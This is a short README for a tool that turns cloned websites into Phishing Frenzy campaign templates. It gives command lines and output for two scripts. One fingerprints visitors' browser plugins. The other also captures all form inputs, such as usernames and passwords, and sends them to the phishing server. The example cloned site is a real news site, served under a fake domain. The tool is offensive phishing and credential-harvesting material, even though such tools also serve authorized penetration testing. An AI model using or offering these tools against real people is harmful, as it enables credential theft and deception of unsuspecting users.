# phishing-frenzy-template-cloner   
   
The script **genTemplate-nopwd.py** is useful if you are interested in generating a phishing frenzy template that fingerprints the browser plugins and sent back these data to the phishing frenzy server.      
```
$ python genTemplate-nopwd.py -c http://edition.cnn.com -u phishingfrenzydomain -i fakedomain.com
- Cloning website: http://edition.cnn.com
- Generated data.html, index.php and index2.php
- Generated attachments.yml and template.yml
- Creating archive
- Generated zip file: template.zip
- You can now import the file in Phishing Frenzy under Templates > Restore
```
  
  
The script **genTemplate-pwd.py** is useful if you are interested in generating a phishing frenzy template that does what **genTemplate-nopwd.py** does plus it captures all form inputs (e.g. username/passwords) and sent back these data to the phishing frenzy server.  
```
$ python genTemplate-pwd.py -c http://edition.cnn.com -u phishingfrenzydomain -i fakedomain.com
- Download PluginDetect Javascript file
- Cloning website: http://edition.cnn.com
- Generated index.php and process.php
- Generated attachments.yml and template.yml
- Creating archive
- Generated zip file: template.zip
- You can now import the file in Phishing Frenzy under Templates > Restore
```

